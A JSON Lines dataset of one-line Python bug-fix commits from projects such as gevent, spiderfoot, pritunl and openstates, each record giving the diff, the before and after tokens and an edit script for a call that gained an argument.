{"project": "gevent", "commit_sha": "0d13ce51b87cef280b2a4603b64081820458d2b8", "parent_sha": "86e6b3c856560bbc920c54a5864db591cb7c515f", "file_path": "util/winvbox.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ def main():\n     parser.add_option('--password', default='')\n     parser.add_option('--version', default='dev')\n     parser.add_option('-v', '--verbose', action='store_true')\n-    parser.add_option('--type')\n+    parser.add_option('--type', default='headless')\n \n     options, args = parser.parse_args()\n \n", "before": "parser . add_option ( '--type' )", "after": "parser . add_option ( '--type' , default = 'headless' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 32], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 22, 3, 32], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:default\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'headless'\", \"T\"], 2]]"}
{"project": "amepah", "commit_sha": "c90bff8ec5dc6884d4f465c4bf81293bca7f128d", "parent_sha": "257bd4cadb84b221fca46d7f26b1c03a970514fc", "file_path": "calibrate_zodi_time.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ class Coadder:\n         cal_uncs = orbit_uncs / abs(gain)\n \n         self.plot_fit(orbit_num, cal_data, zodi_data)\n-        self.plot_fit_improvement(orbit_data, zodi_data, gain_simplefit, offset_simplefit, gain, offset)\n+        self.plot_fit_improvement(orbit_num, orbit_data, zodi_data, gain_simplefit, offset_simplefit, gain, offset)\n \n         zs_data = cal_data - zodi_data\n \n", "before": "self . plot_fit_improvement ( orbit_data , zodi_data , gain_simplefit , offset_simplefit , gain , offset )", "after": "self . plot_fit_improvement ( orbit_num , orbit_data , zodi_data , gain_simplefit , offset_simplefit , gain , offset )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Move\", [\"identifier:orbit_data\", 3, 35, 3, 45], [\"argument_list\", 3, 34, 3, 105], 2], [\"Move\", [\"identifier:zodi_data\", 3, 47, 3, 56], [\"argument_list\", 3, 34, 3, 105], 5], [\"Move\", [\"identifier:gain_simplefit\", 3, 58, 3, 72], [\"argument_list\", 3, 34, 3, 105], 7], [\"Move\", [\"identifier:offset_simplefit\", 3, 74, 3, 90], [\"argument_list\", 3, 34, 3, 105], 9], [\"Move\", [\"identifier:gain\", 3, 92, 3, 96], [\"argument_list\", 3, 34, 3, 105], 11], [\"Insert\", [\"argument_list\", 3, 34, 3, 105], [\"identifier:orbit_num\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 34, 3, 105], [\",:,\", \"T\"], 11]]"}
{"project": "amepah", "commit_sha": "918f44e68de3a5e3b8cd59d44a3eb2689bbcc6a5", "parent_sha": "a0efe917fec3eaa55d31d2a810a8d27b3701a61c", "file_path": "wise_images_2_orbit_coadd/run_wisemapper.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ def main(band, filename, output_path):\n             filelist, mjd_list, orbit_num = next(filelist_gen)\n \n         # Create coadd map of all files in batch\n-        mapmaker = MapMaker(band, n)\n+        mapmaker = MapMaker(band, n, output_path)\n         process_map = RunDistributed(mapmaker.add_image, list(zip(filelist, mjd_list)), iterate=True,\n                                      gather_items=[mapmaker.numerator_cumul, mapmaker.denominator_cumul,\n                                                    mapmaker.time_numerator_cumul, mapmaker.time_denominator_cumul])\n", "before": "mapmaker = MapMaker ( band , n )", "after": "mapmaker = MapMaker ( band , n , output_path )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 37], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 28, 3, 37], [\"identifier:output_path\", \"T\"], 5]]"}
{"project": "gevent", "commit_sha": "f7209c915801833c1e359a711ea266c86da67d19", "parent_sha": "23d55f92bb70b712770d3c9cc694fcc86dd660a0", "file_path": "greentest/util.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ def run(command, **kwargs):\n     assert not err\n     with lock:\n         if out:\n-            out = out.strip().decode()\n+            out = out.strip().decode('utf-8', 'ignore')\n             if out:\n                 out = '  ' + out.replace('\\n', '\\n  ')\n                 out = out.rstrip()\n", "before": "out = out . strip ( ) . decode ( )", "after": "out = out . strip ( ) . decode ( 'utf-8' , 'ignore' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 37, 3, 39], [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 37, 3, 39], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 37, 3, 39], [\"string:'ignore'\", \"T\"], 3]]"}
{"project": "gevent", "commit_sha": "a755c446dc7adafcc9bc1577848acac37a43429e", "parent_sha": "9c7e8e0b62e48b81209c9ace02a4b515012eb880", "file_path": "gevent/greenlet.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -410,7 +410,7 @@ def _kill(greenlet, exception, waiter):\n \n def joinall(greenlets, timeout=None, raise_error=False, count=None):\n     if not raise_error:\n-        wait(greenlets, timeout=timeout)\n+        wait(greenlets, timeout=timeout, count=count)\n     else:\n         for obj in iwait(greenlets, timeout=timeout):\n             if getattr(obj, 'exception', None) is not None:\n", "before": "wait ( greenlets , timeout = timeout )", "after": "wait ( greenlets , timeout = timeout , count = count )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 13, 3, 41], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 13, 3, 41], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:count\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:count\", \"T\"], 2]]"}
{"project": "spiderfoot", "commit_sha": "53cc89e672dd73d7f65a7ae067661095a07b4ac6", "parent_sha": "c590f32f80a87b3038042b0767ea0b1552a8287b", "file_path": "modules/sfp_viewdns.py", "project_url": "https://github.com/smicallef/spiderfoot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -119,7 +119,7 @@ class sfp_viewdns(SpiderFootPlugin):\n                     self.sf.error(\"Error querying ViewDNS.info: \" + r.get(\"error\", \"Unknown\"), False)\n                     return None\n \n-                if len(r.get(responsekey)) == pagesize:\n+                if len(r.get(responsekey), list()) == pagesize:\n                     if accum:\n                         accum.extend(r.get(responsekey))\n                     else:\n", "before": "if len ( r . get ( responsekey ) ) == pagesize : if accum : accum . extend ( r . get ( responsekey ) ) else : ", "after": "if len ( r . get ( responsekey ) , list ( ) ) == pagesize : if accum : accum . extend ( r . get ( responsekey ) ) else : ", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 23, 3, 43], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 23, 3, 43], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 23, 3, 43], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:list\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"):)\", 3, 42, 3, 43], 1]]"}
{"project": "spiderfoot", "commit_sha": "1290b0f8258899bf3f0adf45f825d08f6fd873fc", "parent_sha": "c3e8fc760a9f6e327badb86d1e39169cd6ba1f4a", "file_path": "modules/sfp_citadel.py", "project_url": "https://github.com/smicallef/spiderfoot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -91,7 +91,7 @@ class sfp_citadel(SpiderFootPlugin):\n         except Exception as ex:\n             template = \"An exception of type {0} occurred. Arguments:\\n{1!r}\"\n             message = template.format(type(ex).__name__, ex.args)\n-            self.sf.error(message)\n+            self.sf.error(message, False)\n \n # End of sfp_citadel class\n \n", "before": "self . sf . error ( message )", "after": "self . sf . error ( message , False )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 35], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 26, 3, 35], [\"false:False\", \"T\"], 3]]"}
{"project": "spiderfoot", "commit_sha": "266c7cc11ea886bf630342fc0f8ce65923382543", "parent_sha": "dfc15111567057ec27f15bdac2cde518da142bab", "file_path": "modules/sfp_digitaloceanspace.py", "project_url": "https://github.com/smicallef/spiderfoot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ class sfp_digitaloceanspace(SpiderFootPlugin):\n         return [\"CLOUD_STORAGE_BUCKET\", \"CLOUD_STORAGE_BUCKET_OPEN\"]\n \n     def checkSite(self, url):\n-        res = self.sf.fetchUrl(url, timeout=10, useragent=\"SpiderFoot\")\n+        res = self.sf.fetchUrl(url, timeout=10, useragent=\"SpiderFoot\", noLog=True)\n \n         if res['code'] not in [ \"301\", \"302\", \"200\" ] and \\\n             (res['content'] is None or \"NoSuchBucket\" in res['content']):\n", "before": "res = self . sf . fetchUrl ( url , timeout = 10 , useragent = \"SpiderFoot\" )", "after": "res = self . sf . fetchUrl ( url , timeout = 10 , useragent = \"SpiderFoot\" , noLog = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 72], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 31, 3, 72], [\"keyword_argument\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:noLog\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "ed71fb733d21790a1f75cacb7590102d12f3f710", "parent_sha": "1d5185554c872001dfdf592e76f183a348d2a96d", "file_path": "pritunl/server/bandwidth.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class ServerBandwidth(object):\n             bulk.execute()\n \n     def get_period(self, period):\n-        date_end = self._get_period_timestamp(utils.now())\n+        date_end = self._get_period_timestamp(period, utils.now())\n \n         if period == '1m':\n             date_start = date_end - datetime.timedelta(hours=6)\n", "before": "date_end = self . _get_period_timestamp ( utils . now ( ) )", "after": "date_end = self . _get_period_timestamp ( period , utils . now ( ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 59], [\"identifier:period\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 46, 3, 59], [\",:,\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "d218280d0ea6b5aff82e4b58884c20bdd3b797e2", "parent_sha": "7d7b58f6ff169f2945625705877867622294a901", "file_path": "pritunl/handlers/server.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -515,7 +515,7 @@ def server_link_output_get(server_id):\n @auth.session_auth\n def server_link_output_delete(server_id):\n     svr = server.get_server(id=server_id)\n-    svr.output_link.clear_output()\n+    svr.output_link.clear_output(svr.links.keys())\n     return utils.jsonify({})\n \n @app.app.route('/server/<server_id>/bandwidth/<period>',\n", "before": "svr . output_link . clear_output ( )", "after": "svr . output_link . clear_output ( svr . links . keys ( ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 33, 3, 35], 1], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:keys\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:svr\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:links\", \"T\"], 2]]"}
{"project": "chaussette", "commit_sha": "c8c77505d49eae6c5e628e3d0ce30868802c3714", "parent_sha": "929073a5db342c643636adc4ffa498f619e68602", "file_path": "chaussette/server.py", "project_url": "https://github.com/Mediaclash/chaussette", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ def main():\n     application = args.application\n \n     logger = chaussette_logger\n-    configure_logger(logger)\n+    configure_logger(logger, args.loglevel, args.logoutput)\n \n     if application.startswith('paste:'):\n         from chaussette._paste import paste_app\n", "before": "configure_logger ( logger )", "after": "configure_logger ( logger , args . loglevel , args . logoutput )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 29], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 21, 3, 29], [\"attribute\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 21, 3, 29], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 21, 3, 29], [\"attribute\", \"N1\"], 5], [\"Insert\", \"N0\", [\"identifier:args\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:loglevel\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:args\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:logoutput\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "b81e0150ab8875b00668c60be0d3c0f3802e9824", "parent_sha": "a514885ef7a79375a6c1f5134db9d01b4832dd32", "file_path": "pritunl/server/ip_pool.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -193,7 +193,7 @@ class ServerIpPool:\n         for org in self.server.iter_orgs():\n             org_id = org.id\n \n-            for user in org.iter_users():\n+            for user in org.iter_users(include_pool=True):\n                 try:\n                     remote_ip_addr = ip_pool.next()\n                 except StopIteration:\n", "before": "for user in org . iter_users ( ) : try : remote_ip_addr = ip_pool . next ( ) except StopIteration : ", "after": "for user in org . iter_users ( include_pool = True ) : try : remote_ip_addr = ip_pool . next ( ) except StopIteration : ", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 39, 3, 41], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:include_pool\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "napalm-eos", "commit_sha": "28a43ef51f42a07e699fca6dab5552f09e98f2dc", "parent_sha": "fe3650842651a3704727024ce6614a06abaa5d98", "file_path": "napalm_eos/eos.py", "project_url": "https://github.com/narJH27/napalm-eos", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1012,7 +1012,7 @@ class EOSDriver(NetworkDriver):\n             if prefix not in routes.keys():\n                 routes[prefix] = list()\n             route_protocol = route_details.get('routeType').upper()\n-            preference = route_details.get('preference')\n+            preference = route_details.get('preference', '')\n \n             route = {\n                 'current_active': False,\n", "before": "preference = route_details . get ( 'preference' )", "after": "preference = route_details . get ( 'preference' , '' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 43, 3, 57], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 43, 3, 57], [\"string:''\", \"T\"], 3]]"}
{"project": "pritunl", "commit_sha": "27420965c2a8be39866fe1fcea196b1e1efcd135", "parent_sha": "269f1d23247a5630bb069e895b2d24d8b457b7cd", "file_path": "pritunl/organization.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class Organization(MongoObject):\n \n     def initialize(self):\n         ca_user = User(org=self, type=CERT_CA)\n-        ca_user.queue_initialize()\n+        ca_user.queue_initialize(block=True)\n         self.ca_private_key = ca_user.private_key\n         self.ca_certificate = ca_user.certificate\n \n", "before": "ca_user . queue_initialize ( )", "after": "ca_user . queue_initialize ( block = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:block\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "lektor", "commit_sha": "c38eb5f34019a0bed10ee3c09df534e1b75c2bad", "parent_sha": "20b10e039f84a143a94b1947d0738ec23bcf28a6", "file_path": "lektor/db.py", "project_url": "https://github.com/lektor/lektor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1526,7 +1526,7 @@ class Pad(object):\n \n         if pieces[0].isdigit():\n             if len(pieces) == 1:\n-                return self.get(record['_path'], page_num=int(pieces[0]))\n+                return self.get(record['_path'], alt=record.alt, page_num=int(pieces[0]))\n             return None\n \n         resolver = self.env.virtual_sources.get(pieces[0])\n", "before": "return self . get ( record [ '_path' ] , page_num = int ( pieces [ 0 ] ) )", "after": "return self . get ( record [ '_path' ] , alt = record . alt , page_num = int ( pieces [ 0 ] ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 74], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 32, 3, 74], [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:alt\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:record\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:alt\", \"T\"], 2]]"}
{"project": "btcrelay", "commit_sha": "4bfabdfaf3d5a096a814bc520f384398662ac7c7", "parent_sha": "b98d61ae518d99a15538de746884505fcbd79edd", "file_path": "btcTx_test.py", "project_url": "https://github.com/Runur/btcrelay", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ inset('btcTx.py')\n def testStoreGenesisBlock():\n     # genesis\n     rawBlockHeader = text(\"0100000000000000000000000000000000000000000000000000000000000000000000003ba3edfd7a7b12b27ac72c3e67768f617fc81bc3888a51323a9fb8aa4b1e5e4a29ab5f49ffff001d1dac2b7c\")\n-    res = self.storeRawBlockHeader(rawBlockHeader)\n+    res = self.storeRawBlockHeader(rawBlockHeader, rawBlockHeader)\n     return(res)\n \n \n", "before": "res = self . storeRawBlockHeader ( rawBlockHeader )", "after": "res = self . storeRawBlockHeader ( rawBlockHeader , rawBlockHeader )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 51], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 35, 3, 51], [\"identifier:rawBlockHeader\", \"T\"], 3]]"}
{"project": "btcrelay", "commit_sha": "2dce2e984e7513ca832abf293a6ee74f4598223f", "parent_sha": "0206f92fa21e6364ef69e132844bc272fe5d0a52", "file_path": "test/utilRelay.py", "project_url": "https://github.com/Runur/btcrelay", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ from bitcoin import *\n def makeMerkleProof(header, hashes, txIndex):\n     proof = mk_merkle_proof(header, hashes, txIndex)  # from pybitcointools\n \n-    return argsForVerifyTx(proof)\n+    return argsForVerifyTx(proof, txIndex)\n \n \n def argsForVerifyTx(proof, txIndex):\n", "before": "return argsForVerifyTx ( proof )", "after": "return argsForVerifyTx ( proof , txIndex )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 34], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 27, 3, 34], [\"identifier:txIndex\", \"T\"], 3]]"}
{"project": "spiderfoot", "commit_sha": "09719737dac2266aa49b5bc8e2f0b2e1b5645260", "parent_sha": "6371afda5aaadf24a2cdcba06c3588811cba67ca", "file_path": "modules/sfp_bitcoinwhoswho.py", "project_url": "https://github.com/smicallef/spiderfoot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ class sfp_bitcoinwhoswho(SpiderFootPlugin):\n \n         scams = data.get(\"scams\", [])\n         if scams:\n-            self.emit(\"MALICIOUS_BITCOIN_ADDRESS\", f\"Bitcoin Who's Who [{pevent.data}]\")\n+            self.emit(\"MALICIOUS_BITCOIN_ADDRESS\", f\"Bitcoin Who's Who [{pevent.data}]\", pevent)\n             return True\n \n         return False\n", "before": "self . emit ( \"MALICIOUS_BITCOIN_ADDRESS\" , f\"Bitcoin Who's Who [{pevent.data}]\" )", "after": "self . emit ( \"MALICIOUS_BITCOIN_ADDRESS\" , f\"Bitcoin Who's Who [{pevent.data}]\" , pevent )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 89], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 22, 3, 89], [\"identifier:pevent\", \"T\"], 5]]"}
{"project": "napalm-eos", "commit_sha": "3715eff4f5a09e36464784c3fe76fcf320373641", "parent_sha": "adee78d986e866cbd375874a0e1237f78d461613", "file_path": "napalm_eos/eos.py", "project_url": "https://github.com/narJH27/napalm-eos", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -523,7 +523,7 @@ class EOSDriver(NetworkDriver):\n             for neighbor in interface_neighbors:\n                 if interface not in lldp_neighbors_out.keys():\n                     lldp_neighbors_out[interface] = []\n-                capabilities = neighbor.get('systemCapabilities')\n+                capabilities = neighbor.get('systemCapabilities', {})\n                 capabilities_list = list(capabilities.keys())\n                 capabilities_list.sort()\n                 lldp_neighbors_out[interface].append(\n", "before": "capabilities = neighbor . get ( 'systemCapabilities' )", "after": "capabilities = neighbor . get ( 'systemCapabilities' , { } )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 44, 3, 66], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 44, 3, 66], [\"dictionary\", \"N0\"], 3], [\"Insert\", \"N0\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N0\", [\"}:}\", \"T\"], 1]]"}
{"project": "openstates", "commit_sha": "01210c8d31e6bbc6431cd0edefa10e7766e8ff36", "parent_sha": "60eccda7ed70f7e006469d20c0ecc3902b9a6e57", "file_path": "fiftystates/scrape/md/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -172,7 +172,7 @@ class MDBillScraper(BillScraper):\n         \"\"\" Creates a bill object\n         \"\"\"\n         url = BILL_URL % (year, session, bill_type, number)\n-        with self.urlopen(url) as html:\n+        with self.urlopen(url, raise_errors=True) as html:\n             doc = lxml.html.fromstring(html)\n             # title\n             # find <a name=\"Title\">, get parent dt, get parent dl, then get dd within dl\n", "before": "with self . urlopen ( url ) as html : doc = lxml . html . fromstring ( html )", "after": "with self . urlopen ( url , raise_errors = True ) as html : doc = lxml . html . fromstring ( html )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 31], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 26, 3, 31], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:raise_errors\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "openstates", "commit_sha": "b72a212eee3467e7c0d02c95f9d4057008b972a0", "parent_sha": "38613eba30de2e245afb16cc8964334268f22285", "file_path": "fiftystates/backend/import_california_docs.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ def import_docs(user='', pw='', host='localhost', db_name='capublic'):\n         doc_id = \"CAD%08d\" % seq\n         print \"Saving: %s\" % doc_id\n \n-        fs.put(version.bill_xml, _id=doc_id,\n+        fs.put(version.bill_xml, _id=doc_id, content_type='text/xml',\n                metadata={\"ca_version_id\": version.bill_version_id})\n \n if __name__ == '__main__':\n", "before": "fs . put ( version . bill_xml , _id = doc_id , metadata = { \"ca_version_id\" : version . bill_version_id } )", "after": "fs . put ( version . bill_xml , _id = doc_id , content_type = 'text/xml' , metadata = { \"ca_version_id\" : version . bill_version_id } )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 15, 4, 68], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", [\"argument_list\", 3, 15, 4, 68], [\",:,\", \"T\"], 6], [\"Insert\", \"N0\", [\"identifier:content_type\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'text/xml'\", \"T\"], 2]]"}
{"project": "openstates", "commit_sha": "2c1e09f0276aa3e778e368b3ec65d395277c1f2f", "parent_sha": "392c922a719aa1239fc74b9fc40695c48d4af36b", "file_path": "openstates/oh/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -114,7 +114,7 @@ class OHBillScraper(BillScraper):\n             pdf_links = doc.xpath('//a[text()=\"(.pdf format)\"]')\n             if html_links:\n                 link = html_links[0].get('href')\n-                bill.add_version(name, base_url + link)\n+                bill.add_version(name, base_url + link, on_duplicate='use_old')\n             elif pdf_links:\n                 link = pdf_links[0].get('href')\n                 bill.add_version(name, base_url + link)\n", "before": "bill . add_version ( name , base_url + link )", "after": "bill . add_version ( name , base_url + link , on_duplicate = 'use_old' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 56], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 33, 3, 56], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:on_duplicate\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'use_old'\", \"T\"], 2]]"}
{"project": "openstates", "commit_sha": "436c7c009da8a5fc3051bc731692e5359765b68b", "parent_sha": "40e2f52db1cbdf35e0595d00275d3d1ab8f748ab", "file_path": "openstates/ca/download.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -282,7 +282,7 @@ def load(folder, sql_name=partial(re.compile(r'\\.dat$').sub, '.sql')):\n     os.chdir(folder)\n \n     connection = MySQLdb.connect(user=MYSQL_USER, passwd=MYSQL_PASSWORD,\n-                                 db='capublic')\n+                                 db='capublic', load_infile=1)\n     connection.autocommit(True)\n \n     # For each .dat folder, run its corresponding .sql file.\n", "before": "connection = MySQLdb . connect ( user = MYSQL_USER , passwd = MYSQL_PASSWORD , db = 'capublic' )", "after": "connection = MySQLdb . connect ( user = MYSQL_USER , passwd = MYSQL_PASSWORD , db = 'capublic' , load_infile = 1 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 33, 3, 48], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 2, 33, 3, 48], [\"keyword_argument\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:load_infile\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:1\", \"T\"], 2]]"}
{"project": "openstates", "commit_sha": "2220c8bdc59cc03f66727cd69184b54ee1b51bff", "parent_sha": "d143dcb095e1094ae7f28ed30fe2f6363aa20e91", "file_path": "openstates/mn/events.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class MNEventScraper(EventScraper):\n                 if c in ctty_name.lower():\n                     chamber = chambers[c]\n \n-            event.add_participant('host', ctty_name, chamber=chamber)\n+            event.add_participant('host', ctty_name, 'committee', chamber=chamber)\n             # add chair?\n \n             self.save_event(event)\n", "before": "event . add_participant ( 'host' , ctty_name , chamber = chamber )", "after": "event . add_participant ( 'host' , ctty_name , 'committee' , chamber = chamber )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 70], [\"string:'committee'\", \"T\"], 5], [\"Insert\", [\"argument_list\", 3, 34, 3, 70], [\",:,\", \"T\"], 6]]"}
